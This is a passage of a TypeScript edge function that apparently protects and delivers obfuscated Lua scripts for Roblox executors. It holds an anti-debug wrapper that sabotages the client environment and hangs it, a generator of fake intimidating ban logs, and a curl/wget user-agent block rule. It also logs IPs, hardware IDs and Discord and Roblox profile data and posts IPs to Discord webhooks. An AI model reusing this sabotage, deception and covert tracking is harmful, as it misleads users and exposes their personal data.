      floodLines.push('');
    }
    
    for (let j = 0; j < 10; j++) {
      const ts = Date.now() + Math.floor(Math.random() * 100000);
      floodLines.push(`[${new Date(ts).toISOString()}] THREAT_LOG: bypass_attempt source=${Math.random().toString(36).substring(2, 10)} severity=CRITICAL action=GLOBAL_BAN`);
    }
  }
  
  for (let i = 0; i < 200; i++) {
    floodLines.push(`${'🚨'.repeat(20)} BYPASS ATTEMPT #${i + 1} LOGGED ${'🚨'.repeat(20)}`);
    floodLines.push(`IP BANNED | HWID BANNED | DISCORD ID FLAGGED | ROBLOX ID BLACKLISTED`);
    floodLines.push(`Incident Reference: ULT-${Date.now()}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`);
    floodLines.push('');
  }
  
  // Close the Lua multiline comment
  floodLines.push(']==]');
  
  return floodLines.join('\n');
}

// ===== v12: ADVANCED PROTECTION HELPERS =====

// Geo-blocking: Check IP country using Cloudflare headers
function getCountryFromHeaders(headers: Headers): string {
  return (headers.get('cf-ipcountry') || headers.get('x-country-code') || '').toUpperCase();
}

// Execution limit check
async function checkExecutionLimit(paste: any, uid: string, supabaseClient: any): Promise<boolean> {
  if (!paste.execution_limit_enabled || !paste.execution_limit_per_user || paste.execution_limit_per_user <= 0) return true;
  
  const windowMs: Record<string, number> = {
    'hourly': 3600000,
    'daily': 86400000,
    'weekly': 604800000,
  };
  const window = windowMs[paste.execution_limit_window] || 86400000;
  const windowStart = new Date(Date.now() - window).toISOString();
  
  const { data: existing } = await supabaseClient
    .from('paste_execution_counts')
    .select('id, count')
    .eq('paste_id', paste.id)
    .eq('roblox_user_id', uid)
    .gte('window_start', windowStart)
    .order('window_start', { ascending: false })
    .limit(1)
    .maybeSingle();
  
  if (existing && existing.count >= paste.execution_limit_per_user) return false;
  
  // Increment
  if (existing) {
    await supabaseClient.from('paste_execution_counts').update({ count: existing.count + 1 }).eq('id', existing.id);
  } else {
    await supabaseClient.from('paste_execution_counts').insert({ paste_id: paste.id, roblox_user_id: uid, count: 1 });
  }
  return true;
}

// Multi-account detection
async function checkMultiAccount(paste: any, uid: string, hwid: string | null, supabaseClient: any): Promise<{ allowed: boolean; flagged: boolean }> {
  if (!paste.multi_account_detection || !hwid || hwid.length < 4) return { allowed: true, flagged: false };
  
  try {
    const { data: existing, error } = await supabaseClient
      .from('paste_multi_account_flags')
      .select('*')
      .eq('paste_id', paste.id)
      .eq('hwid', hwid)
      .maybeSingle();
    
    if (error) {
      console.error('[v12] Multi-account query error:', error.message);
      return { allowed: true, flagged: false }; // fail open
    }
    
    if (existing) {
      if (existing.is_blocked) return { allowed: false, flagged: true };
      const ids: string[] = existing.roblox_user_ids || [];
      if (!ids.includes(uid)) {
        ids.push(uid);
        const flagged = ids.length > 1;
        supabaseClient.from('paste_multi_account_flags')
          .update({ roblox_user_ids: ids, is_blocked: ids.length > 3, flagged_at: new Date().toISOString() })
          .eq('id', existing.id).then(() => {}).catch(() => {});
        if (ids.length > 3) return { allowed: false, flagged: true };
        return { allowed: true, flagged };
      }
      return { allowed: true, flagged: ids.length > 1 };
    } else {
      supabaseClient.from('paste_multi_account_flags')
        .upsert({ paste_id: paste.id, hwid, roblox_user_ids: [uid] }, { onConflict: 'paste_id,hwid' })
        .then(() => {}).catch(() => {});
      return { allowed: true, flagged: false };
    }
  } catch (e) {
    console.error('[v12] Multi-account detection error:', e);
    return { allowed: true, flagged: false }; // fail open, don't crash
  }
}

// Crash detection Lua wrapper
function wrapWithCrashDetection(code: string): string {
  const trapVar = '_' + Math.random().toString(36).substring(2, 10);
  const checkVar = '_' + Math.random().toString(36).substring(2, 10);
  return `-- ULT Crash Detection v12
local ${trapVar} = false
local ${checkVar} = coroutine.create(function()
  local ok, err = pcall(function()
    -- If someone hooks decompile/debug.getinfo, this triggers
    local info = debug and debug.getinfo and debug.getinfo(1) or nil
    if info and info.source and info.source:find("decompile") then
      ${trapVar} = true
    end
  end)
end)
pcall(function() coroutine.resume(${checkVar}) end)
if ${trapVar} then
  -- Detected decompile/debug hook - corrupt environment
  pcall(function()
    rawset(_G, "loadstring", function() return function() end end)
    rawset(_G, "game", setmetatable({}, {__index = function() return function() end end}))
  end)
  while true do wait(9e9) end
  return
end
${code}`;
}

// Webhook alert (fire-and-forget)
function fireWebhookAlert(paste: any, uid: string, ip: string, hwid: string | null, eventType: string) {
  if (!paste.webhook_alerts_enabled || !paste.webhook_url) return;
  const webhookUrl = paste.webhook_url;
  if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') && 
      !webhookUrl.startsWith('https://canary.discord.com/api/webhooks/') &&
      !webhookUrl.startsWith('https://ptb.discord.com/api/webhooks/')) return;
  
  const embed = {
    embeds: [{
      title: `🔔 Script ${eventType === 'execution' ? 'Executed' : 'Alert'}`,
      description: `**Paste:** ${paste.title || paste.slug}\n**Roblox ID:** ${uid}\n**IP:** ||${ip}||\n**HWID:** ${hwid ? hwid.substring(0, 16) + '...' : 'N/A'}`,
      color: eventType === 'execution' ? 0x00ff00 : 0xff0000,
      timestamp: new Date().toISOString(),
      footer: { text: 'ULT Protection v12' },
    }],
  };
  
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(embed),
  }).catch(() => {});
}

// Re-obfuscation on delivery — structurally transform the code each time
function applyDeliveryObfuscation(code: string): string {
  // Wrap in a random closure with junk variables
  const vars = Array.from({ length: 5 }, () => '_' + Math.random().toString(36).substring(2, 10));
  const junk = vars.map(v => `local ${v} = ${Math.floor(Math.random() * 99999)}`).join('\n');
  const wrapVar = '_' + Math.random().toString(36).substring(2, 10);
  const execVar = '_' + Math.random().toString(36).substring(2, 10);
  
  // Randomize string literals by XOR encoding them differently each time
  const seed = Math.floor(Math.random() * 255) + 1;
  
  return `${junk}
local ${wrapVar} = (function()
  local ${execVar} = ${Math.floor(Math.random() * 9999)}
  ${vars.map(v => `${v} = ${v} + ${execVar}`).join('\n  ')}
  return function()
    ${code}
  end
end)()
${wrapVar}()`;
}

// Main v12 protection gate — runs before content delivery
async function applyV12Protections(
  paste: any, uid: string, clientIp: string, hwid: string | null,
  slug: string, tk: string, supabaseClient: any, baseUrl: string
): Promise<Response | null> {
  const textHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
    'Content-Type': 'text/plain',
    'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
  };

  // 1. Time Bomb — check if paste has expired
  if (paste.time_bomb_enabled && paste.time_bomb_expires_at) {
    if (new Date(paste.time_bomb_expires_at) < new Date()) {
      console.log(`[v12] TIME_BOMB: paste ${paste.id} expired at ${paste.time_bomb_expires_at}`);
      fireWebhookAlert(paste, uid, clientIp, hwid, 'time_bomb_expired');
      return new Response(generateKickEncrypted('This script has expired', slug, tk, uid), {
        status: 200, headers: textHeaders,
      });
    }
  }

  // 2. Execution Limit
  if (paste.execution_limit_enabled) {
    const allowed = await checkExecutionLimit(paste, uid, supabaseClient);
    if (!allowed) {
      console.log(`[v12] EXEC_LIMIT: uid=${uid} paste=${paste.id} limit=${paste.execution_limit_per_user}/${paste.execution_limit_window}`);
      fireWebhookAlert(paste, uid, clientIp, hwid, 'execution_limit_reached');
      return new Response(generateKickEncrypted(`Execution limit reached (${paste.execution_limit_per_user} per ${paste.execution_limit_window})`, slug, tk, uid), {
        status: 200, headers: textHeaders,
      });
    }
  }

  // 3. Multi-Account Detection
  if (paste.multi_account_detection) {
    const maResult = await checkMultiAccount(paste, uid, hwid, supabaseClient);
    if (!maResult.allowed) {
      console.log(`[v12] MULTI_ACCOUNT: blocked hwid on paste ${paste.id} uid=${uid}`);
      fireWebhookAlert(paste, uid, clientIp, hwid, 'multi_account_blocked');
      return new Response(generateKickEncrypted('Multiple accounts detected on this device - access blocked', slug, tk, uid), {
        status: 200, headers: textHeaders,
      });
    }
    if (maResult.flagged) {
      fireWebhookAlert(paste, uid, clientIp, hwid, 'multi_account_flagged');
    }
  }

  return null; // All checks passed
}

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  // v12.2: Non-blocking ban refresh — only await on first load (cache empty)
  if (globalBanCache.lastRefresh === 0) {
    await refreshGlobalBans();
  } else {
    refreshGlobalBans().catch(() => {});
  }

  // ===== PERMANENT BAN CHECK — first thing, zero processing =====
  const earlyIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
                  req.headers.get('cf-connecting-ip') || 'unknown';
  if (isPermanentlyBanned(earlyIp)) {
    // Auto-resolve and mark as auto-banned since they're already globally banned
    supabase.from('threat_log').insert({
      threat_type: 'banned_ip_access', source_ip: earlyIp, roblox_user_id: null,
      discord_user_id: null, details: { action: 'blocked_at_gate' }, severity: 'high',
      resolved: true, auto_banned: true,
    }).then(() => {}).catch(e => console.error('Threat log failed:', e));
    return new Response('warn("[ULT] Access denied")', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
  }

  // Periodic map cleanup
  cleanupMaps();

  // GLOBAL LOAD SHEDDING — protect DB from being overwhelmed
  if (!checkGlobalLoad()) {
    return new Response('-- Server busy, try again shortly\ngame:GetService("Players").LocalPlayer:Kick("Server is busy. Please rejoin.")', {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
    });
  }

  try {
    const url = new URL(req.url);
    
    // ===== BYPASS REPORT ENDPOINT =====
    // When the Lua loader detects a bypass attempt, it calls this to instantly global-ban the attacker
    const reportAction = url.searchParams.get('_report');
    if (reportAction === 'bypass') {
      const reportUid = url.searchParams.get('uid') || '';
      const reportReason = url.searchParams.get('reason') || 'bypass_attempt';
      const reportDetails = url.searchParams.get('details') || '';
      
      console.log(`[get-paste] BYPASS REPORT: uid=${reportUid} ip=${earlyIp} reason=${reportReason} details=${reportDetails}`);
      
      // Instantly globally ban the Roblox ID
      if (reportUid && /^\d+$/.test(reportUid) && parseInt(reportUid) > 1000) {
        const banReason = `Auto-banned: bypass attempt detected (${reportReason}: ${reportDetails})`;
        
        // Ban Roblox ID
        await supabase.from('global_bans').upsert({
          ban_type: 'roblox_id', ban_value: reportUid,
          reason: banReason, is_active: true,
        }, { onConflict: 'ban_type,ban_value' }).then(() => {}).catch(() => {});
        globalBanCache.robloxIds.add(reportUid);
        
        // Ban IP
        autoBanNewIp(earlyIp, `bypass_${reportReason}`, reportUid, null);
        
        // Find ALL IPs this Roblox user has ever used and ban those too
        const { data: allLogs } = await supabase.from('paste_access_logs')
          .select('ip_address')
          .eq('roblox_user_id', reportUid);
        if (allLogs) {
          for (const log of allLogs) {
            if (log.ip_address && log.ip_address !== earlyIp) {
              autoBanNewIp(log.ip_address, `bypass_associated_ip`, reportUid, null);
            }
          }
        }
        
        // Find any Discord IDs associated with this Roblox user and ban those
        const { data: discordLogs } = await supabase.from('paste_access_logs')
          .select('discord_user_id')
          .eq('roblox_user_id', reportUid)
          .not('discord_user_id', 'is', null);
        if (discordLogs) {
          for (const log of discordLogs) {
            if (log.discord_user_id) {
              await supabase.from('global_bans').upsert({
                ban_type: 'discord_id', ban_value: log.discord_user_id,
                reason: banReason, is_active: true,
              }, { onConflict: 'ban_type,ban_value' }).then(() => {}).catch(() => {});
              globalBanCache.discordIds.add(log.discord_user_id);
            }
          }
        }
        
        // Find other Roblox accounts that share any of this user's IPs (alt detection)
        const userIps = allLogs?.map(l => l.ip_address).filter(Boolean) || [];
        userIps.push(earlyIp);
        const uniqueIps = [...new Set(userIps)];
        if (uniqueIps.length > 0) {
          const { data: altLogs } = await supabase.from('paste_access_logs')
            .select('roblox_user_id')
            .in('ip_address', uniqueIps.slice(0, 50))
            .not('roblox_user_id', 'is', null);
          if (altLogs) {
            const altIds = [...new Set(altLogs.map(l => l.roblox_user_id).filter(id => id && id !== reportUid))];
            for (const altId of altIds) {
              if (altId && parseInt(altId) > 1000) {
                await supabase.from('global_bans').upsert({
                  ban_type: 'roblox_id', ban_value: altId,
                  reason: `Auto-banned: alt of bypass attacker ${reportUid}`, is_active: true,
                }, { onConflict: 'ban_type,ban_value' }).then(() => {}).catch(() => {});
                globalBanCache.robloxIds.add(altId);
              }
            }
          }
        }
        
        // Log as high severity threat
        logThreat('bypass_attempt_auto_ban', earlyIp, reportUid, null, {
          reason: reportReason, details: reportDetails,
          action: 'instant_global_ban', ips_banned: uniqueIps.length,
        }, 'critical', true);
        
        // Force refresh bans cache
        globalBanCache.lastRefresh = 0;
      }
      
      // Return empty - don't give them any info
      return new Response('warn("[ULT] Access denied")', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
    }
    
    const slug = url.searchParams.get('slug');
    const uid = url.searchParams.get('uid');
    const ts = url.searchParams.get('ts');
    const tk = url.searchParams.get('tk');
    const ss = url.searchParams.get('ss');
    const gid = url.searchParams.get('gid');
    const pid = url.searchParams.get('pid');
    const ex = url.searchParams.get('ex');
    const keyParam = url.searchParams.get('key');
    const kbt = url.searchParams.get('kbt');
    const entropy = url.searchParams.get('entropy');
    const snonce = url.searchParams.get('snonce');
    const oauthTs = url.searchParams.get('oauth_ts');
    // v10: New protection params
    const dna = url.searchParams.get('dna');
    const quantumToken = url.searchParams.get('qt');
    const watermarkId = url.searchParams.get('wm');
    const stackDepth = url.searchParams.get('sd');
    const memFingerprint = url.searchParams.get('mem');
    // v10: Ghost trap report
    const ghostReport = url.searchParams.get('ghost');
    // v11: HWID protection
    const hwid = url.searchParams.get('hwid');

    // Check if this Roblox user ID is globally banned — auto-ban the IP too
    if (uid && isRobloxIdBanned(uid)) {
      // Auto-ban this new IP so even VPN hopping gets caught
      autoBanNewIp(earlyIp, 'banned_roblox_user_new_ip', uid, null);
      logThreat('banned_roblox_access', earlyIp, uid, null, { slug, action: 'roblox_id_banned', ip_auto_banned: true }, 'high', true);
      return new Response('warn("[ULT] Access denied")', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
    }

    const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 
                     req.headers.get('cf-connecting-ip') || 
                     'unknown';
    
    const userAgent = req.headers.get('user-agent') || '';
    const accept = req.headers.get('accept') || '';
    const secFetchMode = req.headers.get('sec-fetch-mode') || '';
    const secFetchDest = req.headers.get('sec-fetch-dest') || '';
    const origin = req.headers.get('origin') || '';
    const referer = req.headers.get('referer') || '';
    
    const validationResult = validateRobloxExecutor(req.headers);
    
    console.log(
      `[get-paste] VALIDATION slug=${slug ?? 'none'} ip=${clientIp} ` +
      `valid=${validationResult.valid} reason=${validationResult.reason} ` +
      `ua="${userAgent.substring(0, 50)}"`
    );
    
    // v9: Update trust score based on timing
    updateTrustScore(clientIp, 0); // register request
    if (!checkFetchTiming(clientIp)) {
      console.log(`[get-paste] SUSPICIOUS fetch timing from ${clientIp}`);
    }
    
    // ===== COMPUTE BROWSER/ROBLOX FLAGS EARLY =====
    const uaLowerFull = userAgent.toLowerCase();
    const isRobloxRequest = uaLowerFull.includes('roblox') || 
                            userAgent.includes('HttpService') ||
                            userAgent.includes('WinInet') ||
                            userAgent.includes('RobloxApp') ||
                            // Roblox mobile UAs: "Mozilla/5.0 (XXXXmb; WIDTHxHEIGHT; ..." with device specs
                            /^Mozilla\/5\.0 \(\d+MB;/.test(userAgent);

    const isLikelyBrowser = !isRobloxRequest && (
      Boolean(secFetchMode) ||
      Boolean(secFetchDest) ||
      accept.includes('text/html') ||
      Boolean(origin) ||
      Boolean(referer) ||
      // Fallback: common browser UA patterns (in case sec-fetch headers are stripped)
      (/Mozilla\/\d/.test(userAgent) && /AppleWebKit|Gecko|Chrome|Safari|Firefox|Edge/.test(userAgent))
    );

    // ===== BOT DETECTION (NO AUTO-BAN) =====
    // Serve honeypot to bots but do NOT IP-ban them — Discord crawlers, Facebook embeds,
    // and other legitimate services share infrastructure IPs with real users.
    // Banning these IPs is pointless (they rotate) and risks blocking real users.
    if (!isLikelyBrowser && !isRobloxRequest &&
        !validationResult.valid && validationResult.reason !== 'browser_headers' && 
        validationResult.reason !== 'html_accept' && validationResult.reason !== 'origin_referer') {
      console.log(`[get-paste] BOT BLOCKED (no ban): ${validationResult.reason} from ${clientIp} ua="${userAgent.substring(0, 80)}"`);
      // Only log once per IP per hour to avoid flooding threat log with routine bot traffic
      const botLogKey = `bot_log:${clientIp}`;
      const lastBotLog = ipMismatchTracker.get(botLogKey);
      const now = Date.now();
      if (!lastBotLog || (now - lastBotLog) > 3600_000) {
        ipMismatchTracker.set(botLogKey, now);
        logThreat('bot_access_attempt', clientIp, uid || null, null, { 
          reason: validationResult.reason, 
          user_agent: userAgent.substring(0, 200),
          slug: slug || 'none',
          action: 'honeypot_served_no_ban',
        }, 'low', true);
      }
      return new Response(generateHoneypot(), { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }
    
    // ===== SPOOFED ROBLOX UA DETECTION =====
    // Serve honeypot but do NOT auto-ban — edge cases with unusual Roblox clients
    const spoofCheck = isSpookedRobloxRequest(req.headers);
    if (spoofCheck.spoofed) {
      console.log(`[get-paste] SPOOFED ROBLOX (no ban): ${spoofCheck.reason} from ${clientIp} ua="${userAgent.substring(0, 80)}"`);
      logThreat('spoofed_roblox_ua', clientIp, uid || null, null, {
        reason: spoofCheck.reason,
        user_agent: userAgent.substring(0, 200),
        slug: slug || 'none',
        action: 'honeypot_served_no_ban',
      }, 'medium', true);
      return new Response(generateHoneypot(), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }
    
    // Block spoofed Roblox-Id header (no auto-ban)
    const robloxIdHeader = req.headers.get('roblox-id') || req.headers.get('Roblox-Id') || '';
    if (robloxIdHeader) {
      const robloxIdNum = parseInt(robloxIdHeader, 10);
      if (isNaN(robloxIdNum) || robloxIdNum < 1000) {
        console.log(`[get-paste] BLOCKED: spoofed Roblox-Id="${robloxIdHeader}" from ${clientIp}`);
        logThreat('spoofed_roblox_id', clientIp, null, null, {
          roblox_id_header: robloxIdHeader,
          user_agent: userAgent.substring(0, 200),
          slug: slug || 'none',
          action: 'honeypot_served_no_ban',
        }, 'medium', true);
        return new Response(generateHoneypot(), {
          status: 200,
          headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
        });
      }
    }

    // Block curl/wget (no auto-ban — shared hosting IPs)
    const uaLower = userAgent.toLowerCase();
    if (!isLikelyBrowser && (uaLower.includes('curl') || uaLower.includes('wget') || uaLower.includes('libcurl'))) {
      console.log(`[get-paste] BLOCKED: curl/wget ua="${userAgent}" from ${clientIp}`);
      logThreat('curl_tool_access', clientIp, null, null, {
        user_agent: userAgent.substring(0, 200),
        slug: slug || 'none',
        action: 'honeypot_served_no_ban',
      }, 'low', true);
      return new Response(generateHoneypot(), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }
    
    // ===== DISCORD BOT DETECTION (no auto-ban — Discord crawlers share infra IPs) =====
    if (!isLikelyBrowser && !isRobloxRequest && isDiscordBotRequest(req.headers)) {
      console.log(`[get-paste] DISCORD BOT (no ban): from ${clientIp} ua="${userAgent.substring(0, 80)}"`);
      logThreat('discord_bot_access', clientIp, uid || null, null, {
        user_agent: userAgent.substring(0, 200),
        slug: slug || 'none',
        action: 'honeypot_served_no_ban',
      }, 'low', true);
      return new Response(generateHoneypot(), {
        status: 200,
        headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    if (!checkRateLimit(clientIp)) {
      console.log(`Rate limited: ${clientIp}`);
      return new Response(generateKickPlain('Too many requests - You have been temporarily blocked'), { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    if (!slug) {
      return new Response('warn("[ULT] Missing slug")', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
    }

    // Per-IP-per-slug throttle — stop one IP from hammering the same paste
    if (!checkSlugThrottle(clientIp, slug)) {
      console.log(`Slug throttled: ${clientIp} on ${slug}`);
      return new Response(generateKickPlain('Too many requests for this script - slow down'), { 
        status: 200, 
        headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
      });
    }

    // Supabase client is now module-level (reused across requests)

    if (Math.random() < 0.005) {
      try { await supabase.rpc('cleanup_expired_tokens'); } catch {}
    }

    // Use cached paste data to avoid hammering DB
    let paste = getCachedPaste(slug);
    let error = null;
    if (!paste) {
      // Add timeout to DB query to prevent hanging connections
      try {
        const dbPromise = supabase
          .from('pastes')
          .select('*')
          .eq('slug', slug)
          .single();
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('DB_TIMEOUT')), 15000)
        );
        const result = await Promise.race([dbPromise, timeoutPromise]) as any;
        paste = result.data;
        error = result.error;
        if (paste) setCachedPaste(slug, paste);
      } catch (e: any) {
        if (e?.message === 'DB_TIMEOUT') {
          console.error(`[get-paste] DB timeout for slug=${slug}`);
          return new Response(generateKickPlain('Server is experiencing high load. Please rejoin.'), {
            status: 200,
            headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
          });
        }
        throw e;
      }
    }

    if (error || !paste) {
      return new Response('warn("[ULT] Paste not found")', { status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' } });
    }

    // ===== v12: GEO-BLOCKING =====
    if (paste.geo_blocking_enabled && paste.geo_blocked_countries && paste.geo_blocked_countries.length > 0) {
      const country = getCountryFromHeaders(req.headers);
      if (country && paste.geo_blocked_countries.includes(country)) {
        console.log(`[v12] GEO_BLOCKED: country=${country} slug=${slug} ip=${clientIp}`);
        return new Response(generateKickPlain('This script is not available in your region'), {
          status: 200, headers: { ...corsHeaders, 'Content-Type': 'text/plain' }
        });
      }
    }

    console.log(
      `[get-paste] slug=${slug} uid=${uid ?? ''} hasTk=${Boolean(tk)} hasKey=${Boolean(keyParam)} ip=${clientIp} ` +
      `robloxUA=${isRobloxRequest} browser=${isLikelyBrowser} hide=${Boolean(paste.hide_code)} ` +
      `prot=${Boolean(paste.protection_enabled)} pub=${Boolean(paste.public_protection)}`
    );

    const slugStr = slug;
    const baseUrl = supabaseUrl + '/functions/v1/get-paste';
    const textHeaders = { ...corsHeaders, 'Content-Type': 'text/plain' };

    const respondWithFreshLoader = async () => {
      const newToken = generateToken();
      const sessionSecret = generateSessionSecret(clientIp, Date.now());
      const serverNonce = generateServerNonce();
      const trustLevel = getTrustScore(clientIp);
      // v12.2: Non-blocking token insert — don't wait for DB
      supabase.from('paste_execution_tokens').insert({
        paste_id: paste.id,
        roblox_user_id: '0',
        token: newToken,
        expires_at: new Date(Date.now() + 30000).toISOString(),
        bound_ip: clientIp,
      }).then(() => {}).catch(() => {});
      const loader = generateLoader(slugStr, baseUrl, newToken, sessionSecret, {
        showConsoleFeedback: paste.show_loading_bar !== false,
        serverNonce,
        trustLevel,
      });
      return new Response(loader, { status: 200, headers: textHeaders });
    };

    const logAccess = async (robloxUserId: string | null, accessType: string, enrichWithProfile = false): Promise<string | null> => {
      try {
        if (paste.ip_tracking_enabled === false) return null;
        let discordData: { discord_user_id: string | null; discord_username: string | null; discord_avatar: string | null; discord_created_at: string | null; } = {
          discord_user_id: null, discord_username: null, discord_avatar: null, discord_created_at: null,
        };
        const { data: discordSession } = await supabase
          .from('discord_oauth_sessions')
          .select('*')
          .eq('ip_address', clientIp)
          .gt('expires_at', new Date().toISOString())
          .maybeSingle();
        if (discordSession) {
          // Check if this Discord user is globally banned — auto-ban IP too
          if (isDiscordIdBanned(discordSession.discord_user_id)) {
            autoBanNewIp(clientIp, 'banned_discord_user_new_ip', robloxUserId, discordSession.discord_user_id);
            logThreat('banned_discord_access', clientIp, robloxUserId, discordSession.discord_user_id, { action: 'discord_id_banned', ip_auto_banned: true }, 'high', true);
            // Don't return here — still block silently by not serving content
          }
          discordData = {
            discord_user_id: discordSession.discord_user_id,
            discord_username: discordSession.discord_username,
            discord_avatar: discordSession.discord_avatar,
            discord_created_at: discordSession.discord_created_at,
          };
        }
        let robloxProfile: Awaited<ReturnType<typeof fetchRobloxProfile>> | null = null;
        if (robloxUserId && enrichWithProfile) {
          robloxProfile = await fetchRobloxProfile(robloxUserId);
        }
        let q = supabase.from('paste_access_logs').select('id').eq('paste_id', paste.id).eq('ip_address', clientIp).eq('access_type', accessType);
        q = robloxUserId ? q.eq('roblox_user_id', robloxUserId) : q.is('roblox_user_id', null);
        const { data: existingLog } = await q.maybeSingle();
        const nowIso = new Date().toISOString();
        const updateData: Record<string, unknown> = {
          last_seen_at: nowIso, is_active: true, user_agent: userAgent, ...discordData,
        };
        if (robloxProfile) {
          updateData.roblox_username = robloxProfile.username;
          updateData.roblox_display_name = robloxProfile.displayName;
          updateData.roblox_avatar_url = robloxProfile.avatarUrl;
          updateData.roblox_created_at = robloxProfile.created;
          updateData.roblox_description = robloxProfile.description;
          updateData.roblox_is_banned = robloxProfile.isBanned;
          updateData.roblox_friends_count = robloxProfile.friendsCount;
          updateData.roblox_followers_count = robloxProfile.followersCount;
          updateData.roblox_following_count = robloxProfile.followingCount;
          updateData.roblox_groups = robloxProfile.groups;
          updateData.roblox_badges = robloxProfile.badges;
          updateData.roblox_favorites = robloxProfile.favorites;
        }
        if (existingLog?.id) {
          await supabase.from('paste_access_logs').update(updateData).eq('id', existingLog.id);
          return existingLog.id;
        } else {
          const { data: newLog } = await supabase.from('paste_access_logs').insert({
            paste_id: paste.id, ip_address: clientIp, roblox_user_id: robloxUserId,
            access_type: accessType, ...updateData,
          }).select('id').single();
          return newLog?.id || null;
        }
      } catch (logError) {
        console.error('Failed to log access:', logError);
        return null;
      }
    };

    const shouldRedirectToDiscord = (): boolean => {
      if (!paste.ip_tracking_enabled) return false;
      if (!isLikelyBrowser || isRobloxRequest) return false;
      if (uid || tk) return false;
      const tsNum = oauthTs ? Number(oauthTs) : NaN;
      if (Number.isFinite(tsNum) && Date.now() - tsNum < 60_000) return false;
      return true;
    };

    const getKeyPanelsForPaste = async (): Promise<Array<{ id: string; name: string; created_at: string }>> => {
      const { data: panels, error } = await supabase
        .from('control_panels')
        .select('id, name, created_at')
        .eq('paste_id', paste.id)
        .eq('is_keysystem', true)
        .order('created_at', { ascending: false });

      if (error || !panels || panels.length === 0) return [];
      return panels;
    };

    const getPreferredKeyPanel = async () => {
      const panels = await getKeyPanelsForPaste();
      if (panels.length <= 1) return panels[0] ?? null;

      const panelIds = panels.map((panel) => panel.id);
      const { data: keyedPanels } = await supabase
        .from('control_panel_keys')
        .select('panel_id')
        .in('panel_id', panelIds)
        .order('created_at', { ascending: false })
        .limit(1);

      if (keyedPanels?.[0]?.panel_id) {
        const match = panels.find((panel) => panel.id === keyedPanels[0].panel_id);
        if (match) return match;
      }

      return panels[0];
    };

    // ===== KEY SYSTEM VALIDATION =====
    // When ?key=xxx&uid=xxx is provided, validate the key server-side
    if (keyParam && uid) {
      console.log(`[get-paste] KEY VALIDATION slug=${slug} key=${keyParam.substring(0, 8)}... uid=${uid} ip=${clientIp}`);
      
      const keyPanels = await getKeyPanelsForPaste();
      if (keyPanels.length === 0) {
        return new Response('KEY_INVALID:No key system on this paste', { status: 200, headers: textHeaders });
      }

      const panelIds = keyPanels.map((panel) => panel.id);
      const { data: keyMatches } = await supabase
        .from('control_panel_keys')
        .select('*')
        .in('panel_id', panelIds)
        .eq('key_value', keyParam)
        .order('created_at', { ascending: false })
        .limit(1);

      const keyData = keyMatches?.[0];
      if (!keyData) {
        console.log(`[get-paste] KEY_INVALID: key not found for paste ${paste.id}`);
        return new Response('KEY_INVALID:Wrong key', { status: 200, headers: textHeaders });
      }
      
      // Check expiry
      if (keyData.expires_at && new Date(keyData.expires_at) < new Date()) {
        console.log(`[get-paste] KEY_EXPIRED: key expired for uid=${uid}`);
        return new Response('KEY_EXPIRED:Key has expired', { status: 200, headers: textHeaders });
      }
      
      // Check user ID assignment - keys MUST be pre-assigned to a Roblox User ID
      if (!keyData.roblox_user_id) {
        // Key is not assigned to any user - reject
        console.log(`[get-paste] KEY_UNASSIGNED: key has no user assigned, rejecting uid=${uid}`);
        return new Response('KEY_INVALID:Key not assigned to any user', { status: 200, headers: textHeaders });
      }
      if (keyData.roblox_user_id !== uid) {
        // Key is assigned to a different user
        console.log(`[get-paste] KEY_ASSIGNED: key belongs to ${keyData.roblox_user_id}, not ${uid}`);
        return new Response('KEY_ASSIGNED:Key belongs to another user', { status: 200, headers: textHeaders });
      }
      // Key is assigned to THIS user - allow
      
      // Key is valid! Log execution
      logAccess(uid, 'key_execution', true).catch(() => {});
      await supabase.from('paste_executions').insert({ paste_id: paste.id, roblox_user_id: uid });
      
      // Also cleanup expired keys occasionally
      if (Math.random() < 0.05) {
        try { await supabase.rpc('cleanup_expired_control_panel_keys'); } catch {}
      }
      
      // Key is valid - return content appropriately
      console.log(`[get-paste] KEY_VALID: access granted uid=${uid} for paste ${paste.id} prot=${paste.protection_enabled} pub=${paste.public_protection}`);
      
      // For protected pastes, generate a bypass token and redirect
      // This keeps key system completely separate from the protection flow
      if (paste.protection_enabled || paste.public_protection) {
        const bypassToken = generateToken();
        await supabase.from('paste_execution_tokens').insert({
          paste_id: paste.id, roblox_user_id: uid, token: bypassToken,
          expires_at: new Date(Date.now() + 30000).toISOString(),
          bound_ip: clientIp,
        });
        // Return a simple script that re-fetches the paste with the bypass token
        // The paste URL will then skip the key system and serve the normal protection loader
        const encodedRedirectUrl = encodeUrlForLua(baseUrl, '_ep');
        const redirectScript = `-- Key validated, loading protected script...
${encodedRedirectUrl}
local _url = _ep .. "?slug=${slugStr}&uid=${uid}&kbt=${bypassToken}&_=" .. tostring(tick())
local _r; pcall(function() if request then local resp = request({Url=_url,Method="GET"}) if resp then _r = resp.Body end end end)
if not _r then pcall(function() _r = game:HttpGet(_url) end) end
